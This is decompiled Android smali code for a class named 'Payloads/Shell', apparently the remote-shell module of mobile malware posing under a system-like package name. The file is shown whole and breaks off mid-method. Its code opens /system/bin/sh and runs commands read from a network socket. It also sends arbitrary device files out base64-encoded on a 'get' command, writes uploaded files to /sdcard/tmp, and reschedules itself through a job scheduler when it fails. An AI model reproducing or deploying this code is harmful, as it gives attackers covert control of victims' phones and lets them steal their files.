.class public Lcom/android/ld/Payloads/Shell;
.super Ljava/lang/Object;
.source "Shell.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field activity:Landroid/app/Activity;

.field context:Landroid/content/Context;

.field functions:Lcom/android/ld/functions;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 30
    const-string v0, "newTAGClass"

    sput-object v0, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Landroid/content/Context;)V
    .locals 1
    .param p1, "activity"    # Landroid/app/Activity;
    .param p2, "context"    # Landroid/content/Context;

    .line 35
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 36
    iput-object p2, p0, Lcom/android/ld/Payloads/Shell;->context:Landroid/content/Context;

    .line 37
    iput-object p1, p0, Lcom/android/ld/Payloads/Shell;->activity:Landroid/app/Activity;

    .line 38
    new-instance v0, Lcom/android/ld/functions;

    invoke-direct {v0, p1}, Lcom/android/ld/functions;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/android/ld/Payloads/Shell;->functions:Lcom/android/ld/functions;

    .line 39
    return-void
.end method

.method private getBase64Data(Ljava/io/File;)Ljava/lang/String;
    .locals 8
    .param p1, "file"    # Ljava/io/File;

    .line 137
    const/4 v0, 0x0

    new-array v1, v0, [B

    .line 139
    .local v1, "getBytes":[B
    const/4 v2, 0x0

    :try_start_0
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v3

    long-to-int v4, v3

    new-array v3, v4, [B

    move-object v1, v3

    .line 140
    sget-object v3, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 141
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/32 v5, 0xf42400

    cmp-long v7, v3, v5

    if-lez v7, :cond_0

    .line 142
    return-object v2

    .line 144
    :cond_0
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 145
    .local v3, "is":Ljava/io/InputStream;
    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    .line 146
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 149
    .end local v3    # "is":Ljava/io/InputStream;
    goto :goto_0

    .line 147
    :catch_0
    move-exception v3

    .line 148
    .local v3, "e":Ljava/io/IOException;
    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    .line 150
    .end local v3    # "e":Ljava/io/IOException;
    :goto_0
    const-string v3, ""

    .line 152
    .local v3, "value":Ljava/lang/String;
    :try_start_1
    invoke-static {v1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0
    :try_end_1
    .catch Landroid/util/AndroidRuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    .line 156
    .end local v3    # "value":Ljava/lang/String;
    .local v0, "value":Ljava/lang/String;
    nop

    .line 157
    return-object v0

    .line 153
    .end local v0    # "value":Ljava/lang/String;
    .restart local v3    # "value":Ljava/lang/String;
    :catch_1
    move-exception v0

    .line 154
    .local v0, "e":Landroid/util/AndroidRuntimeException;
    invoke-virtual {v0}, Landroid/util/AndroidRuntimeException;->printStackTrace()V

    .line 155
    return-object v2
.end method

.method private setBase64Data(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p1, "filename"    # Ljava/lang/String;
    .param p2, "base64Data"    # Ljava/lang/String;

    .line 162
    const-string v0, "/sdcard/tmp"

    .line 163
    .local v0, "myfolder":Ljava/lang/String;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 164
    .local v1, "f":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 165
    invoke-virtual {v1}, Ljava/io/File;->mkdir()Z

    .line 167
    :cond_0
    new-instance v2, Ljava/io/File;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 168
    .local v2, "file":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 169
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    .line 171
    :cond_1
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lcom/android/ld/Payloads/Shell$2;

    invoke-direct {v4, p0, v2, p2}, Lcom/android/ld/Payloads/Shell$2;-><init>(Lcom/android/ld/Payloads/Shell;Ljava/io/File;Ljava/lang/String;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 186
    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 187
    return-void
.end method


# virtual methods
.method public executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V
    .locals 25
    .param p1, "socket"    # Ljava/net/Socket;
    .param p2, "outputStream"    # Ljava/io/OutputStream;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 44
    move-object/from16 v1, p0

    move-object/from16 v2, p2

    const-string v3, "|_|"

    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    const-string v4, "channel opened\n"

    invoke-virtual {v4, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/OutputStream;->write([B)V

    .line 45
    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    const-string v4, "END123\n"

    invoke-virtual {v4, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/OutputStream;->write([B)V

    .line 46
    const-string v5, "system/bin/sh"

    .line 47
    .local v5, "cmd":Ljava/lang/String;
    new-instance v0, Ljava/lang/ProcessBuilder;

    const/4 v6, 0x1

    new-array v7, v6, [Ljava/lang/String;

    const/4 v8, 0x0

    aput-object v5, v7, v8

    invoke-direct {v0, v7}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v0, v6}, Ljava/lang/ProcessBuilder;->redirectErrorStream(Z)Ljava/lang/ProcessBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v7

    .line 48
    .local v7, "p":Ljava/lang/Process;
    invoke-virtual {v7}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v9

    .local v9, "pi":Ljava/io/InputStream;
    invoke-virtual {v7}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v10

    .local v10, "pe":Ljava/io/InputStream;
    invoke-virtual/range {p1 .. p1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v11

    .line 49
    .local v11, "si":Ljava/io/InputStream;
    invoke-virtual {v7}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    .local v12, "po":Ljava/io/OutputStream;
    invoke-virtual/range {p1 .. p1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v13

    .line 50
    .local v13, "so":Ljava/io/OutputStream;
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v14, Ljava/io/InputStreamReader;

    invoke-direct {v14, v11}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v14}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v14, v0

    .line 51
    .local v14, "buff1":Ljava/io/BufferedReader;
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v15, Ljava/io/InputStreamReader;

    invoke-direct {v15, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v15}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v15, v0

    .line 53
    .local v15, "buff2":Ljava/io/BufferedReader;
    :goto_0
    invoke-virtual/range {p1 .. p1}, Ljava/net/Socket;->isClosed()Z

    move-result v0

    if-nez v0, :cond_a

    .line 56
    :goto_1
    :try_start_0
    invoke-virtual {v9}, Ljava/io/InputStream;->available()I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_7

    const-string v8, "\n"

    const-string v6, ""

    if-lez v0, :cond_1

    .line 57
    move-object v0, v6

    .line 58
    .local v0, "b":Ljava/lang/String;
    :goto_2
    :try_start_1
    invoke-virtual {v15}, Ljava/io/BufferedReader;->ready()Z

    move-result v6

    if-eqz v6, :cond_0

    .line 59
    invoke-virtual {v15}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    .line 60
    .local v6, "line":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    move-object/from16 v2, p2

    goto :goto_2

    .line 62
    .end local v6    # "line":Ljava/lang/String;
    :cond_0
    sget-object v2, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 63
    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v2

    invoke-virtual {v13, v2}, Ljava/io/OutputStream;->write([B)V

    .line 64
    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v4, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v2

    invoke-virtual {v13, v2}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 65
    .end local v0    # "b":Ljava/lang/String;
    move-object/from16 v2, p2

    const/4 v6, 0x1

    const/4 v8, 0x0

    goto :goto_1

    .line 66
    :cond_1
    :goto_3
    :try_start_2
    invoke-virtual {v10}, Ljava/io/InputStream;->available()I

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_7

    if-lez v0, :cond_2

    .line 67
    :try_start_3
    invoke-virtual {v10}, Ljava/io/InputStream;->read()I

    move-result v0

    invoke-virtual {v13, v0}, Ljava/io/OutputStream;->write(I)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_3

    .line 115
    :catch_0
    move-exception v0

    move-object/from16 v21, v5

    move-object/from16 v23, v9

    const/4 v8, 0x1

    goto/16 :goto_8

    .line 69
    :cond_2
    :goto_4
    :try_start_4
    invoke-virtual {v11}, Ljava/io/InputStream;->available()I

    move-result v0

    if-lez v0, :cond_8

    .line 70
    invoke-virtual {v14}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    .line 71
    .local v0, "a":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object v0, v2

    .line 72
    sget-object v2, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    const-string v2, "putFile"

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_7

    if-eqz v2, :cond_3

    .line 74
    :try_start_5
    const-string v2, "\\<"

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 75
    .local v2, "data":[Ljava/lang/String;
    const/16 v17, 0x1

    aget-object v18, v2, v17

    move-object/from16 v19, v18

    .line 76
    .local v19, "filename":Ljava/lang/String;
    const/16 v18, 0x2

    aget-object v18, v2, v18

    move-object/from16 v20, v18

    .line 77
    .local v20, "fileext":Ljava/lang/String;
    const/16 v18, 0x3

    aget-object v18, v2, v18

    move-object/from16 v21, v18

    .line 78
    .local v21, "encodedString":Ljava/lang/String;
    move-object/from16 v18, v2

    move-object/from16 v2, v21

    .end local v21    # "encodedString":Ljava/lang/String;
    .local v2, "encodedString":Ljava/lang/String;
    .local v18, "data":[Ljava/lang/String;
    invoke-virtual {v2, v4, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v21
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    move-object/from16 v2, v21

    .line 79
    move-object/from16 v21, v5

    .end local v5    # "cmd":Ljava/lang/String;
    .local v21, "cmd":Ljava/lang/String;
    :try_start_6
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v22, v8

    move-object/from16 v8, v19

    .end local v19    # "filename":Ljava/lang/String;
    .local v8, "filename":Ljava/lang/String;
    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v19, v8

    .end local v8    # "filename":Ljava/lang/String;
    .restart local v19    # "filename":Ljava/lang/String;
    const-string v8, "."

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v8, v20

    .end local v20    # "fileext":Ljava/lang/String;
    .local v8, "fileext":Ljava/lang/String;
    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 80
    .local v5, "fullFile":Ljava/lang/String;
    invoke-direct {v1, v5, v2}, Lcom/android/ld/Payloads/Shell;->setBase64Data(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    .line 81
    .end local v2    # "encodedString":Ljava/lang/String;
    .end local v5    # "fullFile":Ljava/lang/String;
    .end local v8    # "fileext":Ljava/lang/String;
    .end local v18    # "data":[Ljava/lang/String;
    .end local v19    # "filename":Ljava/lang/String;
    move-object/from16 v18, v6

    move-object/from16 v23, v9

    const/4 v8, 0x1

    goto/16 :goto_7

    .line 115
    .end local v0    # "a":Ljava/lang/String;
    :catch_1
    move-exception v0

    move-object/from16 v23, v9

    const/4 v8, 0x1

    goto/16 :goto_8

    .end local v21    # "cmd":Ljava/lang/String;
    .local v5, "cmd":Ljava/lang/String;
    :catch_2
    move-exception v0

    move-object/from16 v21, v5

    move-object/from16 v23, v9

    const/4 v8, 0x1

    .end local v5    # "cmd":Ljava/lang/String;
    .restart local v21    # "cmd":Ljava/lang/String;
    goto/16 :goto_8

    .line 81
    .end local v21    # "cmd":Ljava/lang/String;
    .restart local v0    # "a":Ljava/lang/String;
    .restart local v5    # "cmd":Ljava/lang/String;
    :cond_3
    move-object/from16 v21, v5

    move-object/from16 v22, v8

    .end local v5    # "cmd":Ljava/lang/String;
    .restart local v21    # "cmd":Ljava/lang/String;
    :try_start_7
    const-string v2, "get "

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 82
    const-string v2, " "

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x1

    aget-object v2, v2, v5

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    .line 83
    .local v2, "filepath":Ljava/lang/String;
    sget-object v5, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;

    invoke-static {v5, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 84
    new-instance v5, Ljava/io/File;

    invoke-direct {v5, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 85
    .local v5, "file":Ljava/io/File;
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_5

    .line 86
    move-object v8, v6

    .line 87
    .local v8, "sending_filedata":Ljava/lang/String;
    move-object/from16 v18, v6

    const-string v6, "/"

    invoke-virtual {v2, v6}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v6

    const/16 v17, 0x1

    add-int/lit8 v6, v6, 0x1

    invoke-virtual {v2, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v6

    .line 88
    .local v6, "full_filename":Ljava/lang/String;
    move-object/from16 v19, v2

    .end local v2    # "filepath":Ljava/lang/String;
    .local v19, "filepath":Ljava/lang/String;
    const-string v2, "\\."

    invoke-virtual {v6, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 89
    .local v2, "file_data":[Ljava/lang/String;
    move-object/from16 v20, v6

    .end local v6    # "full_filename":Ljava/lang/String;
    .local v20, "full_filename":Ljava/lang/String;
    sget-object v6, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    move-object/from16 v23, v9

    .end local v9    # "pi":Ljava/io/InputStream;
    .local v23, "pi":Ljava/io/InputStream;
    :try_start_8
    const-string v9, "exists"

    invoke-static {v6, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 90
    invoke-direct {v1, v5}, Lcom/android/ld/Payloads/Shell;->getBase64Data(Ljava/io/File;)Ljava/lang/String;

    move-result-object v6

    .line 91
    .local v6, "base64_data":Ljava/lang/String;
    if-nez v6, :cond_4

    .line 92
    const-string v9, "Can\'t transfer Large File\nEND123\n"

    move-object/from16 v24, v5

    .end local v5    # "file":Ljava/io/File;
    .local v24, "file":Ljava/io/File;
    sget-object v5, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v9, v5}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/io/OutputStream;->write([B)V

    goto :goto_5

    .line 91
    .end local v24    # "file":Ljava/io/File;
    .restart local v5    # "file":Ljava/io/File;
    :cond_4
    move-object/from16 v24, v5

    .line 94
    .end local v5    # "file":Ljava/io/File;
    .restart local v24    # "file":Ljava/io/File;
    :goto_5
    const-string v5, "getFile\nEND123\n"

    sget-object v9, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v5, v9}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/io/OutputStream;->write([B)V

    .line 95
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v16, v8

    const/4 v9, 0x0

    .end local v8    # "sending_filedata":Ljava/lang/String;
    .local v16, "sending_filedata":Ljava/lang/String;
    aget-object v8, v2, v9

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    const/4 v8, 0x1

    :try_start_9
    aget-object v9, v2, v8

    invoke-virtual {v5, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nEND123\n"

    invoke-virtual {v5, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 96
    .end local v16    # "sending_filedata":Ljava/lang/String;
    .local v5, "sending_filedata":Ljava/lang/String;
    sget-object v9, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v5, v9}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v9

    invoke-virtual {v13, v9}, Ljava/io/OutputStream;->write([B)V

    .line 97
    .end local v2    # "file_data":[Ljava/lang/String;
    .end local v5    # "sending_filedata":Ljava/lang/String;
    .end local v6    # "base64_data":Ljava/lang/String;
    .end local v20    # "full_filename":Ljava/lang/String;
    goto :goto_6

    .line 115
    .end local v0    # "a":Ljava/lang/String;
    .end local v19    # "filepath":Ljava/lang/String;
    .end local v24    # "file":Ljava/io/File;
    :catch_3
    move-exception v0

    const/4 v8, 0x1

    goto/16 :goto_8

    .line 98
    .end local v23    # "pi":Ljava/io/InputStream;
    .restart local v0    # "a":Ljava/lang/String;
    .local v2, "filepath":Ljava/lang/String;
    .local v5, "file":Ljava/io/File;
    .restart local v9    # "pi":Ljava/io/InputStream;
    :cond_5
    move-object/from16 v19, v2

    move-object/from16 v24, v5

    move-object/from16 v18, v6

    move-object/from16 v23, v9

    const/4 v8, 0x1

    .end local v2    # "filepath":Ljava/lang/String;
    .end local v5    # "file":Ljava/io/File;
    .end local v9    # "pi":Ljava/io/InputStream;
    .restart local v19    # "filepath":Ljava/lang/String;
    .restart local v23    # "pi":Ljava/io/InputStream;
    .restart local v24    # "file":Ljava/io/File;
    sget-object v2, Lcom/android/ld/Payloads/Shell;->TAG:Ljava/lang/String;

    const-string v5, "notexists"

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 99
    const-string v2, "File Doesnt Exists\nEND123\n"

    sget-object v5, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v2, v5}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v2

    invoke-virtual {v13, v2}, Ljava/io/OutputStream;->write([B)V

    .line 101
    .end local v19    # "filepath":Ljava/lang/String;
    .end local v24    # "file":Ljava/io/File;
    :goto_6
    goto :goto_7

    .end local v23    # "pi":Ljava/io/InputStream;
    .restart local v9    # "pi":Ljava/io/InputStream;
    :cond_6
    move-object/from16 v18, v6

    move-object/from16 v23, v9

    const/4 v8, 0x1

    .end local v9    # "pi":Ljava/io/InputStream;
    .restart local v23    # "pi":Ljava/io/InputStream;
    const-string v2, "put "

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_7

    .line 102
    const-string v2, "putFile\nEND123\n"

    sget-object v5, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v2, v5}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v2

    invoke-virtual {v13, v2}, Ljava/io/OutputStream;->write([B)V

    goto :goto_7

    .line 104
    :cond_7
    sget-object v2, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v2}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v2

    invoke-virtual {v12, v2}, Ljava/io/OutputStream;->write([B)V

    .line 106
    .end local v0    # "a":Ljava/lang/String;
    :goto_7
    move-object/from16 v6, v18

    move-object/from16 v5, v21

    move-object/from16 v8, v22

    move-object/from16 v9, v23

    goto/16 :goto_4

    .line 115
    .end local v23    # "pi":Ljava/io/InputStream;
    .restart local v9    # "pi":Ljava/io/InputStream;
    :catch_4
    move-exception v0

    move-object/from16 v23, v9

    const/4 v8, 0x1

    .end local v9    # "pi":Ljava/io/InputStream;
    .restart local v23    # "pi":Ljava/io/InputStream;
    goto :goto_8

    .line 107
    .end local v21    # "cmd":Ljava/lang/String;
    .end local v23    # "pi":Ljava/io/InputStream;
    .local v5, "cmd":Ljava/lang/String;
    .restart local v9    # "pi":Ljava/io/InputStream;
    :cond_8
    move-object/from16 v21, v5

    move-object/from16 v23, v9

    const/4 v8, 0x1

    .end local v5    # "cmd":Ljava/lang/String;
    .end local v9    # "pi":Ljava/io/InputStream;
    .restart local v21    # "cmd":Ljava/lang/String;
    .restart local v23    # "pi":Ljava/io/InputStream;
    invoke-virtual {v13}, Ljava/io/OutputStream;->flush()V

    .line 108
    invoke-virtual {v12}, Ljava/io/OutputStream;->flush()V

    .line 109
    const-wide/16 v5, 0x32

    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    .line 111
    :try_start_a
    invoke-virtual {v7}, Ljava/lang/Process;->exitValue()I
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    .line 112
    goto :goto_b

    .line 113
    :catch_5
    move-exception v0

    goto :goto_a

    .line 115
    :catch_6
    move-exception v0

    goto :goto_8

    .end local v21    # "cmd":Ljava/lang/String;
    .end local v23    # "pi":Ljava/io/InputStream;
    .restart local v5    # "cmd":Ljava/lang/String;
    .restart local v9    # "pi":Ljava/io/InputStream;
    :catch_7
    move-exception v0

    move-object/from16 v21, v5

    move-object/from16 v23, v9

    const/4 v8, 0x1

    .line 116
    .end local v5    # "cmd":Ljava/lang/String;
    .end local v9    # "pi":Ljava/io/InputStream;
    .local v0, "e":Ljava/lang/Exception;
    .restart local v21    # "cmd":Ljava/lang/String;
    .restart local v23    # "pi":Ljava/io/InputStream;
    :goto_8
    const-string v2, "service_runner"

    const-string v5, "called"

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 117
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x15

    if-lt v2, v5, :cond_9

    .line 118
    iget-object v2, v1, Lcom/android/ld/Payloads/Shell;->functions:Lcom/android/ld/functions;

    iget-object v5, v1, Lcom/android/ld/Payloads/Shell;->context:Landroid/content/Context;

    invoke-virtual {v2, v5}, Lcom/android/ld/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_9

    .line 120
    :cond_9
    iget-object v2, v1, Lcom/android/ld/Payloads/Shell;->activity:Landroid/app/Activity;

    new-instance v5, Lcom/android/ld/Payloads/Shell$1;

    invoke-direct {v5, v1}, Lcom/android/ld/Payloads/Shell$1;-><init>(Lcom/android/ld/Payloads/Shell;)V

    invoke-virtual {v2, v5}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 127
    :goto_9
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 128
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_a
    move-object/from16 v2, p2

    move-object/from16 v5, v21

    move-object/from16 v9, v23

    const/4 v6, 0x1

    const/4 v8, 0x0

    goto/16 :goto_0

    .line 53
    .end local v21    # "cmd":Ljava/lang/String;
    .end local v23    # "pi":Ljava/io/InputStream;
    .restart local v5    # "cmd":Ljava/lang/String;
    .restart local v9    # "pi":Ljava/io/InputStream;
    :cond_a
    move-object/from16 v21, v5

    move-object/from16 v23, v9

    .line 130
    .end local v5    # "cmd":Ljava/lang/String;
    .end local v9    # "pi":Ljava/io/InputStream;
    .restart local v21    # "cmd":Ljava/lang/String;
